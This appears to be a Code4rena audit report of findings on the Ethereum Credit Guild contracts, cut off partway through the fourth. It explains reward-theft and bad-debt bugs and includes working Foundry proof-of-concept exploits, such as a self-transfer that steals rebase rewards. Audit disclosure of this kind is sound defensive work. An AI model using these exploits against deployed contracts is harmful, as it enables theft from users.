[H-01] TheuserGaugeProfitIndexis not set correctly, allowing an attacker to receive rewards without waiting
Submitted byArz, also found bydeliriusz,Infect3d,Neon2835,AlexCzm,evmboi32,Chinmay,0xpiken,0xStalin,sl1,almurhasan,HighDuty, Tendency (1,2),zhaojohnson,c47ch3m4ll,JCN,santipu_,asui,kaden,TheSchnilch,klau5, ether_sky (1,2), andcritical-or-high
WhenclaimGaugeRewards()is called for the first time before the user votes for a gauge, theuserGaugeProfitIndexshould be set to the currentgaugeProfitIndex, later when thegaugeProfitIndexgrows the user will be able to claim the rewards.
The problem here is that the first timeclaimGaugeRewards()is called theuserGaugeProfitIndexis not set to anything because of this check:
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L416-L418
416:if(_userGaugeWeight==0) {417:return0;418:  }
So an attacker can vote for a gauge after profit is notified,claimGaugeRewards()will be called for the first time inincrementGauge(); however, theuserGaugeProfitIndexwill not be set and will be0.
The attacker will then callclaimGaugeRewards()again and because theuserGaugeProfitIndex== 0it will be set to 1e18. Since thegaugeProfitIndexis bigger than 1e18, the attacker will receive rewards without waiting.
Impact
The attacker will receive rewards without waiting and can repeat this until all rewards are stolen. Other users will then fail to claim their rewards and will receive nothing.
Proof of Concept
Add this toProfitManager.t.solandimport "@forge-std/console.sol";
As you can see, the attacker will be able to steal rewards in the same transaction.
functiontestAttackClaimAfterProfit()public{addressattacker=makeAddr("attacker");vm.startPrank(governor);core.grantRole(CoreRoles.GOVERNOR,address(this));core.grantRole(CoreRoles.CREDIT_MINTER,address(this));core.grantRole(CoreRoles.GUILD_MINTER,address(this));core.grantRole(CoreRoles.GAUGE_ADD,address(this));core.grantRole(CoreRoles.GAUGE_PARAMETERS,address(this));core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER,address(this));vm.stopPrank();vm.prank(governor);profitManager.setProfitSharingConfig(0,// surplusBufferSplit0.5e18,// creditSplit0.5e18,// guildSplit0,// otherSplitaddress(0)// otherRecipient);guild.setMaxGauges(1);guild.addGauge(1,gauge1);guild.mint(attacker,150e18);guild.mint(bob,400e18);vm.prank(bob);guild.incrementGauge(gauge1,400e18);credit.mint(address(profitManager),20e18);profitManager.notifyPnL(gauge1,20e18);//Attacker votes for a gauge after it notifies profit//The userGaugeProfitIndex of the attacker is not setvm.prank(attacker);guild.incrementGauge(gauge1,150e18);//Because the userGaugeProfitIndex is not set it will be set to 1e18//The gaugeProfitIndex will be 1.025e18 so the attacker will steal the rewardsprofitManager.claimGaugeRewards(attacker,gauge1);console.log(credit.balanceOf(attacker));//Other users will then fail to claim their rewardsvm.expectRevert(bytes("ERC20: transfer amount exceeds balance"));profitManager.claimGaugeRewards(bob,gauge1);console.log(credit.balanceOf(bob));}
Tools Used
Foundry
Recommended Mitigation Steps
WhenuserGaugeProfitIndexequals0it should be set to the currentgaugeProfitIndexand it should be set the first timeclaimGaugeRewards()is called.
eswak (Ethereum Credit Guild) confirmed, but disagreed with severity and commented via duplicate issue #1211:
Disputing severity (I think it’s more fit for medium because there is no loss of user funds, just rewards).
TrungOre (judge) commented via duplicate issue #1211:
I consider this issue a high severity because the rewards in ProfitManager are matured yield, which should be distributed to the intended users. The loss of matured yield is considered a high-severity issue based on C4’s criteria.

[H-02] Anyone can steal all distributed rewards
Submitted byevmboi32, also found bySoul22,stackachu,0xadrii,KingNFT,Jorgect,Tendency,SpicyMeatball,c47ch3m4ll,0xAlix2,3docSec,kaden, andcritical-or-high
Lines of code
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20RebaseDistributor.sol#L553-L642
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20RebaseDistributor.sol#L607
Impact
Anyone can steal all distributed rewards, due to a caching error, when transferring credit tokens to themselves while in rebase.
Proof of Concept
Transferring credit while in rebase works fine when transferring to other users. But when a user tries to transfer to himself he can steal all unminted distributed rewards until that point.
Let’s imagine that some credit tokens were distributed but not yet minted. Alice enters rebase and callstransfer(alice, x):
RebasingStatememoryrebasingStateFrom=rebasingState[msg.sender];RebasingStatememoryrebasingStateTo=rebasingState[to];
Both states formsg.senderandtoare stored in memory. Keep in mind thatmsg.sender == to == alice. In the firstif, the rewards for Alice are minted which is0since she just entered rebase:
if(rebasingStateFrom.isRebasing==1) {uint256shares=uint256(rebasingStateFrom.nShares);uint256rebasedBalance=_shares2balance(shares,_rebasingSharePrice,0,fromBalanceBefore);uint256mintAmount=rebasedBalance-fromBalanceBefore;if(mintAmount!=0) {ERC20._mint(msg.sender,mintAmount);fromBalanceBefore+=mintAmount;decreaseUnmintedRebaseRewards(mintAmount);emitRebaseReward(msg.sender,block.timestamp,mintAmount);}}
In the secondif, we decrease the shares that Alice sent out, but the change is applied to a storage variable ofrebasingStateformsg.sender. This means that the cachedrebasingStateFrom == rebasingStateTostill holds the old value of shares as thenShares.
if(rebasingStateFrom.isRebasing==1) {uint256fromBalanceAfter=fromBalanceBefore-amount;uint256fromSharesAfter=_balance2shares(fromBalanceAfter,_rebasingSharePrice);uint256sharesSpent=rebasingStateFrom.nShares-fromSharesAfter;sharesDelta-=int256(sharesSpent);rebasingState[msg.sender] =RebasingState({isRebasing:1,nShares:uint248(fromSharesAfter)});}
This will cause that thetoBalanceAfterin the finalifto be calculated incorrectly because it calculates using the old shares, as we use the cached value of shares from the beginning of the function. This will keep the balance the same+theamountadded on top.
uint256toBalanceAfter=_shares2balance(rebasingStateTo.nShares,_rebasingSharePrice,amount,rawToBalanceAfter);
Then, extra tokens are minted which should not be:
uint256mintAmount=toBalanceAfter-rawToBalanceAfter;if(mintAmount!=0) {ERC20._mint(to,mintAmount);decreaseUnmintedRebaseRewards(mintAmount);emitRebaseReward(to,block.timestamp,mintAmount);}
Alice can nowexitRebaseand keep the tokens for herself.
Let’s also look at a practical example with numbers
Alice has100 credittokens worthXshares. There are still some unminted rewards (unmintedRebaseRewards() >= 100e18).She callstransfer(alice, 100e18).The firstifdoes nothing and the tokens are transferred. At this point, both token balance and share balance for Alice remain the same as before transfer.The secondifadjusts the shares that Alice spent, but the value is stored in the storage variable. So she spentXshares since she transferred the whole balance the current state is as follows:
// storagerebasingState[alice] =RebasingState({isRebasing:1,nShares:0});
But therebasingStateTovariable still holds the old number of shares as it was not updated (keep in mind thatmsg.sender == to == alice.toBalanceAfteris calculated as200tokens now. Since therebasingStateTo.nSharesisX, and on top of that, we add the amount and results into200tokens. The share price remains the same. TherawToBalanceAfterdidn’t change during the transfer and still remains at a100tokens.
uint256rawToBalanceAfter=ERC20.balanceOf(to);uint256toBalanceAfter=_shares2balance(rebasingStateTo.nShares,_rebasingSharePrice,amount,rawToBalanceAfter);
Finally, the rewards for Alice are minted. This will result inmintAmount = 100e18.
uint256mintAmount=toBalanceAfter-rawToBalanceAfter;if(mintAmount!=0) {ERC20._mint(to,mintAmount);decreaseUnmintedRebaseRewards(mintAmount);emitRebaseReward(to,block.timestamp,mintAmount);}
Alice now stole tokens from other rebasing users. The max number of tokens she can steal isunmintedRebaseRewards()for any given self-transfer. So ifunmintedRebaseRewards() == 10e18she needs to calltransfer(alice, 10e18)so she can steal the unclaimed rewards. She could monitor the mempool and frontrun each transaction that would change theunmintedRebaseRewardsvariable and essentially rob users of all rewards. Each call is doneatomicallyso there is0 riskfor Alice.
Coded POC
Add this in theERC20RebaseDistributor.t.solfile and add importimport "@forge-std/console.sol";.
Run withforge test --match-path ./test/unit/tokens/ERC20RebaseDistributor.t.sol -vvv:
functiontestSelfTransfer()public{token.mint(address(this),100e18);// Mint some tokens to bob and alicetoken.mint(alice,10e18);token.mint(bobby,10e18);// Bob enters the rebase since he wants to earn some profitvm.prank(bobby);token.enterRebase();// Tokens are distributed among all rebase userstoken.distribute(10e18);// Nobody claims the rebase rewards for 10 days - just for an example// Alice could frontrun every call that changes the unmintedRebaseRewards atomically// and claim all the rewards for herselfvm.warp(block.timestamp+10days);// --------------------- ATOMIC TX ---------------------vm.startPrank(alice);token.enterRebase();uint256token_balance_alice_before=token.balanceOf(alice);// Here the max she could transfer and steal is the unmintedRebaseRewards() amount// but we are using 3e18 just for an example as 3e18 < unmintedRebaseRewards()// since there is no public getter for unmintedRebaseRewardstoken.transfer(alice,3e18);token.exitRebase();vm.stopPrank();uint256token_balance_alice=token.balanceOf(alice);// --------------------- END ATOMIC TX ---------------------console.log("Token balance alice before : ",token_balance_alice_before);console.log("Token balance alice after  : ",token_balance_alice);console.log("--------------------------------------------------");console.log("Alice profit credit        : ",token_balance_alice-token_balance_alice_before);}
[PASS]testSelfTransfer() (gas:230035)Logs:Token balance alice before :  10000000000000000000Token balance alice after  :  12999999999999999999--------------------------------------------------Alice profit credit        :  2999999999999999999
Recommended Mitigation Steps
Prevent self-transfer, as it makes no sense and also causes harm.
Assessed type
Token-Transfer
eswak (Ethereum Credit Guild) confirmed and commented:
Thanks for the very high quality report. Definitely one of the most critical issues that I’ve been made aware of on this audit.

[H-03] The creation of bad debt (mark-downof Credit) can force other loans in auction to also create bad debt
Submitted byJCN, also found byJCN,Soul22,AlexCzm,grearlake, Chinmay (1,2),0xStalin,c47ch3m4ll,Cosine,xeros,3docSec,Inference, andalmurhasan
The creation of bad debt results in themark downofCredit, i.e.Creditexperiences inflation. This is done so that the protocol can adjust to the bad debt that was produced. It follows that whenCreditis marked down all active loans can be consideredmarked up; meaning, the borrowers will be expected to repay with moreCredit, sinceCreditis now worthless. We can observe how this is done by examining theLendingTerm::getLoanDebtfunction:
LendingTerm::getLoanDebt#L216-L230
216:// compute interest owed217:uint256borrowAmount=loan.borrowAmount;218:uint256interest= (borrowAmount*219:params.interestRate*220:            (block.timestamp-borrowTime)) /221:YEAR/222:1e18;223:uint256loanDebt=borrowAmount+interest;224:uint256_openingFee=params.openingFee;225:if(_openingFee!=0) {226:loanDebt+= (borrowAmount*_openingFee) /1e18;227:        }228:uint256creditMultiplier=ProfitManager(refs.profitManager)229:            .creditMultiplier();230:loanDebt= (loanDebt*loan.borrowCreditMultiplier) /creditMultiplier;
As we can see above, the debt of a borrower (principle + interests) is adjusted by thecreditMultiplier. ThiscreditMultiplierstarts at1e18and getsmarked downwhen bad debt is produced in the system. Theloan.borrowCreditMultiplieris thecreditMultipliervalue at the time that the user took out the loan. Therefore, this function calculates the adjusted debt of a borrower with respect to the amount of bad debt that was produced (inflation ofCredit) since the borrower took out the loan. This function is called every time a borrower makes a payment for their loan, ensuring that the appropriate debt is always considered. However, this function is only called once during the entire auction process:
LendingTerm::_call#L664-L668
664:// update loan in state665:uint256loanDebt=getLoanDebt(loanId);666:loans[loanId].callTime=block.timestamp;667:loans[loanId].callDebt=loanDebt;668:loans[loanId].caller=caller;
The above code is taken from the_callfunction, which is the starting point for an auction. When a loan misses arequiredpartialPaymentor the term is offboarded, this function can be permissionlessly called. As we can see, the debt of the loan is read from thegetLoanDebtfunction and then stored in theloanstruct in thecallDebtfield. This means that thecallDebtrepresents a snapshot of the debt atblock.timestamp. Therefore, thecallDebtis the loan debt with respect to thecreditMultipliervalued at the time that the loan was called. What if thecreditMultipliergets updated after the auction process begins? This would result in thecallDebtof the loan being less than what the actual debt of the loan should be (Creditis worth less, but the collateral is worth the same). We can understand the true magnitude of this discrepancy by observing theLendingTerm::onBidfunction:
LendingTerm::onBid#L750-L768
750:// compute pnl751:uint256creditMultiplier=ProfitManager(refs.profitManager)752:            .creditMultiplier();753:uint256borrowAmount=loans[loanId].borrowAmount;754:uint256principal= (borrowAmount*755:loans[loanId].borrowCreditMultiplier) /creditMultiplier;756:int256pnl;757:uint256interest;758:if(creditFromBidder>=principal) {759:interest=creditFromBidder-principal;760:pnl=int256(interest);761:        }else{762:pnl=int256(creditFromBidder) -int256(principal);763:principal=creditFromBidder;764:require(765:collateralToBorrower==0,766:"LendingTerm: invalid collateral movement"767:            );768:        }
As we can see above, theprincipleof the loan is calculated with respect to the currentcreditMultiplier. ThecreditFromBidderis thecallDebtwhen the auction is in its first phase:
AuctionHouse::getBidDetail#L133-L136
133:// first phase of the auction, where more and more collateral is offered134:if(block.timestamp<_startTime+midPoint) {135:// ask for the full debt136:creditAsked=auctions[loanId].callDebt;
This is where the issue lies. Remember, thecallDebtrepresents a snapshot of the loan debt at the time which the loan was called. ThecallDebtdoes not consider a potential updatedcreditMultiplier. Therefore, if amark downis generated that results inprinciple > creditFromBidder, then execution of theonBidfunction would continue on line 762. This will result in a negativepnlbeing calculated, which ultimately means that this gauge will experience a loss. However, if thecollateralToBorrowerisnot0, the function will revert. Therefore, when theprincipleis greater than thecallDebt, due to themark downofCredit, the auction can only receive a bid if thecollateralToBorroweris0. Let us observe theAuctionHouse::bidandAuctionHouse::getBidDetailfunctions in order to understand what scenario would result incollateralToBorrower == 0:
AuctionHouse::bid#L169-L186
169:        (uint256collateralReceived,uint256creditAsked) =getBidDetail(170:loanId171:        );172:require(creditAsked!=0,"AuctionHouse: cannot bid 0");...180:LendingTerm(_lendingTerm).onBid(181:loanId,182:msg.sender,183:auctions[loanId].collateralAmount-collateralReceived,// collateralToBorrower184:collateralReceived,// collateralToBidder185:creditAsked// creditFromBidder186:        );
As seen above, theonBidDetailfunction is invoked to retrieve the necessarycollateralReceivedandcreditAskedvalues. TheonBidfunction is then invoked and thecollateralToBorroweris equal to thecollateralAmount - collateralReceived. ThecollateralAmountis the full collateral of the loan. Therefore, if thecollateralReceived == collateralAmount, we will have satisfied the following condition:collateralToBorrower == 0. This is exactly what occurs during the second phase of an auction:
AuctionHouse::getBidDetail#L143-L146
143:// second phase of the auction, where less and less CREDIT is asked144:elseif(block.timestamp<_startTime+auctionDuration) {145:// receive the full collateral146:collateralReceived=auctions[loanId].collateralAmount;
Therefore, given the situation where a loan is placed in auction and then a large enoughmark downofCreditoccurs, such thatprinciple > creditFromBidder, only bids occurring during the second phase of the auction will be allowed. In addition, given thatprinciple > creditFromBidder, bad debt will also be produced in this auction.
Let’s briefly discuss what scenarios would result inprinciple > callDebt. Reminder: ThecallDebtrepresents the maximum value thatcreditFromBiddercan be. ThecallDebtis a snapshot of the full debt of a borrower (principle + interests). Therefore, if themark downresults in a percent decrease ofCreditgreater than the interest of the borrower’s loan, then the adjustedprinciplewill be greater than thecallDebt. Consider the following situation:
A term has an interest rate of 4%. The term has multiple loans opened and the term is being off-boarded after half a year. Let’s assume no loans have been paid off during this time. Therefore, the interest for all loans is ~2%. Suppose a loan undergoes auction before other loans are called and this loan results in the creation of bad debt (worst case scenario), which results in amark down> 2%. All other loans that are in auction during thismark downwill be forced to create bad debt since the adjustedprinciplefor all loans in auction will be greater than the loans’callDebt.
Impact
The creation of bad debt has the potential to force other loans to create additional bad debt if the following conditions are met:
The other loans were in auction during themark down.Themark downis greater than the interest owed for the loans.The global surplus buffer is not manually replenished before each additional bad debt creation (funds essentially sacrificed).
This can greatly impact the health of the protocol as theCredittoken is used for all core functionalities. Amark downis a mechanism to allow the system to properly adjust to the creation of bad debt; however, I would argue that the creation of bad debt should not result in other loans being forced to produce losses which can ultimately produce more bad debt.
This has the ability to affect loans in other terms as well. All loans in auction during themark down, originating from any term in the market, can potentially be forced to produce a loss/bad debt. The magnitude of this additionalmark downofCreditwill be greater if the affected loans have relatively low interest accrued and a large borrow amount.
Secondary effects are that no user’s will be able to bid during the first phase of the auction. This first phase is meant to be an opportunity for the borrower to properly repay their full debt before the second phase begins, where the borrower can potentially be out-bid by another liquidator and lose the opportunity to receive their collateral.
Proof of Concept
The following test demonstrates the scenario described above in which amark downofCreditresults in other loans in auction being forced to create additional bad debt.
Place the test inside of thetest/unit/loan/directory:
// SPDX-License-Identifier: GPL-3.0-or-laterpragmasolidity0.8.13;import{Clones}from"@openzeppelin/contracts/proxy/Clones.sol";import{Test}from"@forge-std/Test.sol";import{Core}from"@src/core/Core.sol";import{CoreRoles}from"@src/core/CoreRoles.sol";import{MockERC20}from"@test/mock/MockERC20.sol";import{SimplePSM}from"@src/loan/SimplePSM.sol";import{GuildToken}from"@src/tokens/GuildToken.sol";import{CreditToken}from"@src/tokens/CreditToken.sol";import{LendingTerm}from"@src/loan/LendingTerm.sol";import{AuctionHouse}from"@src/loan/AuctionHouse.sol";import{ProfitManager}from"@src/governance/ProfitManager.sol";import{RateLimitedMinter}from"@src/rate-limits/RateLimitedMinter.sol";contractBadDebtCreatesBadDebtisTest{addressprivategovernor=address(1);addressprivateguardian=address(2);addressstaker=address(0x01010101);addressborrower=address(0x02020202);addresslender=address(0x03030303);Coreprivatecore;ProfitManagerprivateprofitManager;CreditTokencredit;GuildTokenguild;MockERC20collateral;MockERC20pegToken;SimplePSMprivatepsm;RateLimitedMinterrlcm;AuctionHouseauctionHouse;LendingTermterm;// LendingTerm params (same as deployment script)uint256constant_CREDIT_PER_COLLATERAL_TOKEN=1e18;// 1:1uint256constant_INTEREST_RATE=0.04e18;// 4% APRuint256constant_MAX_DELAY_BETWEEN_PARTIAL_REPAY=0;uint256constant_MIN_PARTIAL_REPAY_PERCENT=0;uint256constant_HARDCAP=2_000_000e18;// 2 millionuint256publicissuance=0;functionsetUp()public{vm.warp(1679067867);vm.roll(16848497);core=newCore();profitManager=newProfitManager(address(core));collateral=newMockERC20();pegToken=newMockERC20();// 18 decimals for easy calculations (deployment script uses USDC which has 6 decimals)credit=newCreditToken(address(core),"name","symbol");guild=newGuildToken(address(core),address(profitManager));rlcm=newRateLimitedMinter(address(core)/*_core*/,address(credit)/*_token*/,CoreRoles.RATE_LIMITED_CREDIT_MINTER/*_role*/,0/*_maxRateLimitPerSecond*/,0/*_rateLimitPerSecond*/,uint128(_HARDCAP)/*_bufferCap*/);auctionHouse=newAuctionHouse(address(core),650,1800);term=LendingTerm(Clones.clone(address(newLendingTerm())));term.initialize(address(core),LendingTerm.LendingTermReferences({profitManager:address(profitManager),guildToken:address(guild),auctionHouse:address(auctionHouse),creditMinter:address(rlcm),creditToken:address(credit)}),LendingTerm.LendingTermParams({collateralToken:address(collateral),maxDebtPerCollateralToken:_CREDIT_PER_COLLATERAL_TOKEN,interestRate:_INTEREST_RATE,maxDelayBetweenPartialRepay:_MAX_DELAY_BETWEEN_PARTIAL_REPAY,minPartialRepayPercent:_MIN_PARTIAL_REPAY_PERCENT,openingFee:0,hardCap:_HARDCAP}));psm=newSimplePSM(address(core),address(profitManager),address(credit),address(pegToken));profitManager.initializeReferences(address(credit),address(guild),address(psm));// rolescore.grantRole(CoreRoles.GOVERNOR,governor);core.grantRole(CoreRoles.GUARDIAN,guardian);core.grantRole(CoreRoles.CREDIT_MINTER,address(this));core.grantRole(CoreRoles.GUILD_MINTER,address(this));core.grantRole(CoreRoles.GAUGE_ADD,address(this));core.grantRole(CoreRoles.GAUGE_REMOVE,address(this));core.grantRole(CoreRoles.GAUGE_PARAMETERS,address(this));core.grantRole(CoreRoles.CREDIT_MINTER,address(rlcm));core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER,address(term));core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER,address(term));core.grantRole(CoreRoles.CREDIT_MINTER,address(psm));core.grantRole(CoreRoles.CREDIT_REBASE_PARAMETERS,address(psm));core.renounceRole(CoreRoles.GOVERNOR,address(this));// add gaugeguild.setMaxGauges(10);guild.addGauge(1,address(term));}functiontestBadDebtCreatesBadDebt()public{// staker increases term debtCeilingguild.mint(staker,1000e18);vm.startPrank(staker);guild.incrementGauge(address(term),1000e18);vm.stopPrank();assertEq(guild.getGaugeWeight(address(term)),1000e18);// term has 12 active loans all with various borrow sizes (1_000_000 in total loans)// 1st loan = 80_000e18collateral.mint(borrower,1_000_000e18);uint256[]memoryborrowAmounts=newuint256[](11);bytes32[]memoryloanIds=newbytes32[](11);borrowAmounts[0] =1_000e18;borrowAmounts[1] =5_000e18;borrowAmounts[2] =10_000e18;borrowAmounts[3] =25_000e18;borrowAmounts[4] =100_000e18;borrowAmounts[5] =50_000e18;borrowAmounts[6] =300_000e18;borrowAmounts[7] =18_000e18;borrowAmounts[8] =90_000e18;borrowAmounts[9] =250_000e18;borrowAmounts[10] =71_000e18;vm.prank(borrower);collateral.approve(address(term),1_000_000e18);// create 1st loan (loan that will create bad debt)bytes32loanId;vm.startPrank(borrower);loanId=term.borrow(80_000e18,80_000e18);vm.roll(block.number+1);vm.warp(block.timestamp+13);vm.stopPrank();// create the rest of the loans (loans that will be forced to create bad debt)for(uint256i;i<borrowAmounts.length;i++) {vm.startPrank(borrower);loanIds[i] =term.borrow(borrowAmounts[i],borrowAmounts[i]);vm.roll(block.number+1);vm.warp(block.timestamp+13);vm.stopPrank();}assertEq(term.issuance(),1_000_000e18);assertEq(credit.balanceOf(borrower),1_000_000e18);assertEq(credit.totalSupply(),1_000_000e18);// lenders supply 1_000_000 pegToken in psm (credit.totalSupply == 2_000_000)pegToken.mint(lender,1_000_000e18);vm.startPrank(lender);pegToken.approve(address(psm),1_000_000e18);psm.mintAndEnterRebase(1_000_000e18);vm.stopPrank();assertEq(credit.totalSupply(),2_000_000e18);// half a year later all loans accrued ~2% interestvm.warp(block.timestamp+ (term.YEAR() /2));// term is offboardedguild.removeGauge(address(term));assertEq(guild.isGauge(address(term)),false);// one loan is called before the others and it creates bad debt (markdown > % interest owed by other loans)term.call(loanId);// no ones bids and loan creates bad debt (worse case scenario)vm.warp(block.timestamp+auctionHouse.auctionDuration());(,uint256creditAsked) =auctionHouse.getBidDetail(loanId);assertEq(creditAsked,0);// phase 2 ended// all loans called via callMany right before bad debt + markdown occurs// to demonstrate that any auctions live while markdown occurred would be affected (including auctions in diff terms)term.callMany(loanIds);// bad debt created, i.e. markdown of 4%// note that for demonstration purposes there are no surplus buffersauctionHouse.forgive(loanId);assertEq(term.issuance(),1_000_000e18-80_000e18);assertEq(credit.totalSupply(),2_000_000e18);assertEq(profitManager.creditMultiplier(),0.96e18);// credit marked down// no one can bid during phase 1 of any other loans that were in auction when the markdown occurred// due to principle > creditFromBidder, therefore collateral to borrower must be 0, i.e. all collateral is offered, i.e. must be phase 2for(uint256i;i<loanIds.length;i++) {( ,creditAsked) =auctionHouse.getBidDetail(loanIds[i]);// verify we are in phase 1 (creditAsked == callDebt)assertEq(auctionHouse.getAuction(loanIds[i]).callDebt,creditAsked);// attempt to bid during phase 1credit.mint(address(this),creditAsked);credit.approve(address(term),creditAsked);vm.expectRevert("LendingTerm: invalid collateral movement");auctionHouse.bid(loanIds[i]);}// fast forward to the beginning of phase 2vm.warp(block.timestamp+auctionHouse.midPoint());vm.roll(block.number+1);// all other loans that are in auction will be forced to only receive bids in phase 2// bad debt is gauranteed to be created for all these loans, so user's are incentivized to// bid at the top of phase 2. This would result in the liquidator receiving the collateral at a discount.// The loans with less accrued interest and a bigger principle/borrow amount will result in a bigger loss, i.e. greater markdownemitlog_named_uint("creditMultiplier before updates",profitManager.creditMultiplier());uint256collateralReceived;for(uint256i;i<loanIds.length;i++) {(collateralReceived,creditAsked) =auctionHouse.getBidDetail(loanIds[i]);// verify we are at the top of phase 2 (collateralReceived == collateralAmount | creditAsked == callDebt)assertEq(auctionHouse.getAuction(loanIds[i]).callDebt,creditAsked);assertEq(auctionHouse.getAuction(loanIds[i]).collateralAmount,collateralReceived);// bid at top of phase two (bidder receives collateral at a discount & protocol incurs more bad debt)credit.mint(address(this),creditAsked);credit.approve(address(term),creditAsked);auctionHouse.bid(loanIds[i]);multiplierUpdated();}}functionmultiplierUpdated()internal{// credit multiiplier decreases which each auctionuint256multiiplier=profitManager.creditMultiplier();emitlog_named_uint("creditMultiplier updated",multiiplier);}}
Recommended Mitigation Steps
Creditdebt is calculated in most areas of the system with respect to the current multiplier, except for during the auction process. I would suggest calculating thecallDebtdynamically with respect to the currentcreditMultiplierduring the auction process instead of having it represent a ‘snapshot’ of the borrower’s debt.
TrungOre (judge) increased severity to High
eswak (Ethereum Credit Guild) confirmed via duplicate issue #1069:
Note: For full discussion, seehere.

[H-04] Users staking via theSurplusGuildMintercan be immediately slashed when staking into a gauge that had previously incurred a loss
Submitted byJCN, also found bycarrotsmuggler,Chinmay,beber89,XDZIBECX,serial-coder,Varun_05,Infect3d,stackachu,AlexCzm,0xdice91,jasonxiale,HighDuty,imare,cats,developerjordy,0xaltego,0xadrii,DanielArmstrong,cccz,sl1,wangxx2026,Akali,SECURITISE,smiling_heretic,Timeless,KupiaSec,PENGUN,alexzoid,Stormreckson,0xpiken,SweetDream,whitehat-boys,klau5,btk,0xivas,santipu_,asui,grearlake,TheSchnilch,kaden,Inference, andether_sky
User’s can stake into a gauge directly via theGuildTokenor indirectly via theSurplusGuildMinter. When a user stakes into a new gauge (i.e. their weight goes from0to> 0) viaGuildToken::incrementGauge, theirlastGaugeLossAppliedmapping for this gauge, which is how the system keeps track of whether or not the user deserves to be slashed, is set to the current timestamp:
GuildToken.sol#L247-L256
247:uint256_lastGaugeLoss=lastGaugeLoss[gauge];248:uint256_lastGaugeLossApplied=lastGaugeLossApplied[gauge][user];249:if(getUserGaugeWeight[user][gauge] ==0) {250:lastGaugeLossApplied[gauge][user] =block.timestamp;251:        }else{252:require(253:_lastGaugeLossApplied>=_lastGaugeLoss,254:"GuildToken: pending loss"255:            );256:        }
This ensures that any loss that occurred in the gauge, before the user staked, will result in the following condition:lastGaugeLossApplied[gauge][user] > lastGaugeLoss[gauge]. This means the user staked into the gauge after the gauge experienced a loss and therefore, they can not be slashed:
GuildToken.sol#L133-L140
133:functionapplyGaugeLoss(addressgauge,addresswho)external{134:// check preconditions135:uint256_lastGaugeLoss=lastGaugeLoss[gauge];136:uint256_lastGaugeLossApplied=lastGaugeLossApplied[gauge][who];137:require(138:_lastGaugeLoss!=0&&_lastGaugeLossApplied<_lastGaugeLoss,139:"GuildToken: no loss to apply"140:        );
The above function showcases the requirements that need to be met in order for a user to be slashed: the user must have been staked in the gauge when the gauge experienced a loss in order for the user to be slashed. With this in mind, let us observe the process that occurs when users stake via theSurplusGuildMinter:
When a user stakes into a gauge via theSurpluGuildMinter::stakefunction theSurplusGuildMinter::getRewardsfunction is invoked:
SurplusGuildMinter.sol#L216-L236
216:functiongetRewards(217:addressuser,218:addressterm219:    )220:public221:returns(222:uint256lastGaugeLoss,// GuildToken.lastGaugeLoss(term)223:UserStakememoryuserStake,// stake state after execution of getRewards()224:boolslashed// true if the user has been slashed225:        )226:    {227:boolupdateState;228:lastGaugeLoss=GuildToken(guild).lastGaugeLoss(term);229:if(lastGaugeLoss>uint256(userStake.lastGaugeLoss)) {230:slashed=true;231:        }232:233:// if the user is not staking, do nothing234:userStake=_stakes[user][term];235:if(userStake.stakeTime==0)236:return(lastGaugeLoss,userStake,slashed);
As seen above, this function will retrieve thelastGaugeLossfor the specified gauge (term) the user is staking into and will identify this user as being slashed, i.e.slashed = true, iflastGaugeLoss > userStake.lastGaugeLoss. The issue lies in the fact that, at this point in the code execution, theuserStakestruct is a freshly initialized memory struct and therefore, all of the struct’s fields are set to0. Thus, the check on lines 229-230 are really doing the following:
if(lastGaugeLoss>uint256(0)) {slashed=true;}
The above code will always setslashedtotrueif the specified gauge has experienced any loss in its history. Therefore, a gauge can have experienced a loss, been off-boarded, and then been re-onboarded at a future time and TheSurplusGuildMinterwill consider any user who stakes into this gauge to beslashed.
The code execution will then continue to lines 235-236, where the user’s stake is retrieved from storage (it is initialized to all0’s since the user has not staked yet) and if thestakeTimefield is0(it is), the execution returns to theGuildToken::stakefunction:
SurplusGuildMinter.sol#L114-L125
114:functionstake(addressterm,uint256amount)externalwhenNotPaused{115:// apply pending rewards116:        (uint256lastGaugeLoss,UserStakememoryuserStake, ) =getRewards(117:msg.sender,118:term119:        );120:121:require(122:lastGaugeLoss!=block.timestamp,123:"SurplusGuildMinter: loss in block"124:        );125:require(amount>=MIN_STAKE,"SurplusGuildMinter: min stake");
The above code illustrates the only validation checks that are performed in thisstakefunction. As long as the user is not attempting to stake into a gauge in the same block that the gauge experienced a loss, and the user is staking at least1e18, the user’sstakeposition will be initialized (the user will be allowed to stake theirCredit):
SurplusGuildMinter.sol#L114-L125
139:userStake=UserStake({140:stakeTime:SafeCastLib.safeCastTo48(block.timestamp),141:lastGaugeLoss:SafeCastLib.safeCastTo48(lastGaugeLoss),142:profitIndex:SafeCastLib.safeCastTo160(143:ProfitManager(profitManager).userGaugeProfitIndex(144:address(this),145:term146:                )147:            ),148:credit:userStake.credit+SafeCastLib.safeCastTo128(amount),149:guild:userStake.guild+SafeCastLib.safeCastTo128(guildAmount)150:        });151:_stakes[msg.sender][term] =userStake;
The user would naturally perform the next actions: They can callSurplusGuildMinter::getRewardswhen they want to receive rewards and they can callSurplusGuildMinter::unstakewhen they want to unstake from their position, i.e. withdraw their depositedCredit. It is important to note that when theunstakefunction is called, similar to thestakefunction, thegetRewardsfunction will first be invoked. As we previously observed, thegetRewardsfunction will consider the userslashedif the gauge had previously experienced any loss in its history. Therefore, after a user has staked, any call togetRewardswill result in the following logic to execute:
SurplusGuildMinter.sol#L274-L289
274:if(slashed) {275:emitUnstake(block.timestamp,term,uint256(userStake.credit));276:userStake=UserStake({277:stakeTime:uint48(0),278:lastGaugeLoss:uint48(0),279:profitIndex:uint160(0),280:credit:uint128(0),281:guild:uint128(0)282:            });283:updateState=true;284:        }285:286:// store the updated stake, if needed287:if(updateState) {288:_stakes[user][term] =userStake;289:        }
As we can see above, when a user callsgetRewardsorunstakeafter staking into a gauge that has experienced a loss sometime in its history, the user’sstakeposition will be deleted (slashed). If the user is attempting to unstake then the execution flow will continue in theunstakefunction:
SurplusGuildMinter.sol#L158-L166C25
